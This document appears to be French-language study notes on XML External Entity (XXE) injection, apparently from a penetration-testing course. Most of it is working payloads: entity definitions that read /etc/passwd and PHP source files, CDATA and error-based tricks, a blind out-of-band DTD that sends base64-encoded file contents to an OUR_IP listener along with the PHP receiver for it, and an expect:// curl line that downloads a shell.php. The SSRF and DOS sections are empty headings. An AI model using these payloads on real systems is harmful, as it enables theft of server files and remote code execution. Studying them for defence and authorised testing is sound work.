`<`, `>`, `&`, or `"`
`&lt;`, `&gt;`, `&amp;`, `&quot;`
## XML Document Type Definition (DTD)
```xml
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
`PUBLIC` ou  `SYSTEM` pour un chemin externe
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```


## Identification
Si on peut définir des entités et afficher.  Alors possible de référencer entités externes
Si requête envois du XML
Une application affiche le contenu de `<email>`
`<email>untel@htb.com</email>`
Définir un DTD et le référencer
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
	<email>
		&company;
	</email>
</root>
```
Si `Inlane Freight` est affiché alors vulnérable.

## JSON
La requête peut être faite en JSON mais accepte XML. Transformer alors en XML [online tool](https://www.convertjson.com/json-to-xml.htm)

## Lecture
Certains charactères ne sont pas permis dans les fichiers `<`/`>`/`&`. utiliser divers filtres PHP
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

### CDATA
Permet d'ignorer les charactères spéciaux, mais le joint ne fonctionne pas avec entités externes et internes:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

Servir le fichier `xxe.dtd` de joint depuis notre serveur
```xml
<!ENTITY joined "%begin;%file;%end;">
```
### Erreurs
Générer une erreur. Pas toujours fiable: peut avoir limite de charactères ou ne pas afficher charactères spéciaux.
Servir le fichier suivant contenant une erreur
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Référencer les entités
```xml
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```
### À l'aveugle
1. Servir le fichier `xxe.dtd` et `index.php`
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
```shell-session
php -S 0.0.0.0:8000
```
2.  
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

## Exécution de code
`php://expect://id` pour commandes simples qui ne brisent pas la syntax XML. Requière le module `expect`
Sinon, envoyer un remote shell. Remplacer espace par `$IFS`
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
```

## SSRF

## DOS